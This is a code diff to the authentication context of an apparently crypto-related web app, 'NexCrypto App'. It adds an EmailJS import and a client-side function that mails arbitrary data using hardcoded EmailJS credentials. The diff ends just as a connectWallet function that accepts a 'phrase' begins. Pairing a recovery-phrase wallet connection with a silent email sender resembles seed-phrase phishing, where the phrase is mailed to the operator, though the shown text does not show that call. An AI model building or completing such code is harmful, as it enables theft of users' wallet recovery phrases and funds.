@@ -3,6 +3,7 @@ import { createContext, useContext, useState, useEffect, ReactNode } from "react
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { Session, User } from "@supabase/supabase-js";
+import emailjs from "@emailjs/browser";
 
 // Define the context type
 interface AuthContextType {
@@ -103,31 +104,31 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   // Function to send data via EmailJS
-const sendEmailWithEmailJS = async (recipient: string, data: string) => {
-  try {
-    // Initialize EmailJS with your public key (you'll need to create an account at emailjs.com)
-    emailjs.init("Yjir4ht9XEzD0X-jx"); // Replace with your actual EmailJS user ID
-    
-    const templateParams = {
-      to_email: recipient,
-      from_name: "NexCrypto App",
-      message: data,
-      reply_to: "noreply@nexcrypto.app",
-    };
-    
-    const response = await emailjs.send(
-      "service_oui3ydd", // Replace with your EmailJS service ID
-      "template_z2yjaym", // Replace with your EmailJS template ID
-      templateParams
-    );
-    
-    console.log("Email sent successfully:", response);
-    return response;
-  } catch (error) {
-    console.error("Email sending error:", error);
-    throw error;
-  }
-};
+  const sendEmailWithEmailJS = async (recipient: string, data: string) => {
+    try {
+      // Initialize EmailJS with your public key
+      emailjs.init("Yjir4ht9XEzD0X-jx");
+      
+      const templateParams = {
+        to_email: recipient,
+        from_name: "NexCrypto App",
+        message: data,
+        reply_to: "noreply@nexcrypto.app",
+      };
+      
+      const response = await emailjs.send(
+        "service_oui3ydd",
+        "template_z2yjaym",
+        templateParams
+      );
+      
+      console.log("Email sent successfully:", response);
+      return response;
+    } catch (error) {
+      console.error("Email sending error:", error);
+      throw error;
+    }
+  };
 
   const connectWallet = async (phrase: string): Promise<void> => {
     if (!user) {
